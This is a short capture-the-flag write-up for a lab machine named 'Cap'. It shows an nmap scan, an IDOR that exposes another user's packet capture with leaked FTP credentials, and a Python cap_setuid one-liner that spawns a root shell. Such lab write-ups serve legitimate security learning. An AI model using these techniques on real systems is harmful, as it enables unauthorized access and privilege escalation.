# Cap

## Nmap scan:
```
Nmap scan report for 10.129.17.149
Host is up (0.023s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Writeup:
Running an nmap scan only reveals port `21`, `22` and `80` open.

Looking into port `80` reveals a gunicorn application.
This allows viewing pcaps, as referenced by an `id` parameter in the URL.
It is possible to view other pcap logs by modifying `id`.
If `id` is set to `0`, then the pcap of another user is viewable.
Downloading this pcap and opening it in `wireshark` reveals credentials leaked through unencrypted `ftp` traffic.
These credentials also work with `ssh`.
From there running `getcap -r / 2>/dev/null` reveals `python3.8` has `cap_setuid`, allowing it to set it's own UID.
Thus the following command grants `root`:
- `/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash");'`
